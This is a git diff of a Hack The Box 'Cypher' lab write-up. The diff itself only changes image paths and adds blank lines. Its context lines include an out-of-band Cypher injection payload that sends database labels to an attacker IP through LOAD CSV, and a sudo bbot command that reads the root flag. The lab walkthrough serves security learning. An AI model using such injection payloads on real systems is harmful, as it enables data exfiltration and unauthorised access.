@@ -5,7 +5,7 @@ categories: [HTB Medium Machines]
 tags: [Medium, Linux, HTB, Cypher Injection, BBOT, Java File]
 ---
 
-<img src="../../assets/img/cypher/image.png">
+<img src="/assets/img/cypher/image.png">
 
 Cypher is a medium HTB machine where we can perform a `cypher injection` to execute a `custom function` that we find inside a .jar file to get a foothold. From there, we find credentials that can be used to move laterally. Finally we abuse a multipurpose script to read the root flag.
 
@@ -34,7 +34,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 > Let’s add the domain to our /etc/hosts file: `echo -e '10.10.11.57\tcypher.htb' | sudo tee -a /etc/hosts`
 
 Let's have a look at [http://cypher.htb](http://cypher.htb):
-<img src="../../assets/img/cypher/image2.png">
+<img src="/assets/img/cypher/image2.png">
 
 Fuzzing for directories reveals some interesting stuff:
 ```bash
@@ -68,15 +68,15 @@ testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 3
 > login, api and testing seem interesting
 
 Inside [http://cypher.htb/testing/](http://cypher.htb/testing/), we find a `.jar` application:
-<img src="../../assets/img/cypher/image3.png">
+<img src="/assets/img/cypher/image3.png">
 
 # Exploit
 ## Cypher Injection
 Using a `'` inside the Username in the login panel at [http://cypher.htb/login](http://cypher.htb/login) seems to break the cypher query it's using:
- <img src="../../assets/img/cypher/image4.png">
+ <img src="/assets/img/cypher/image4.png">
 
 We can craft a cypher injection to test if it's actually working, this [page](https://pentester.land/blog/cypher-injection-cheatsheet/#example-out-of-band-injection) was of great help:
-<img src="../../assets/img/cypher/image5.png">
+<img src="/assets/img/cypher/image5.png">
 >`' RETURN 0 as hash UNION CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.20/?p=' + label AS r RETURN 0 as hash//`
 
 > We're ending the original query and using the clause `UNION` to perform another query, in this case retrieving the labels.
@@ -211,3 +211,6 @@ graphasm@cypher:~$ sudo bbot /root/root.txt
 [TRCE] Caught exception in resolve_raw(74b6d3567439423b55869b075c458533, {}):
 <SNIP>
 ```
+
+
+
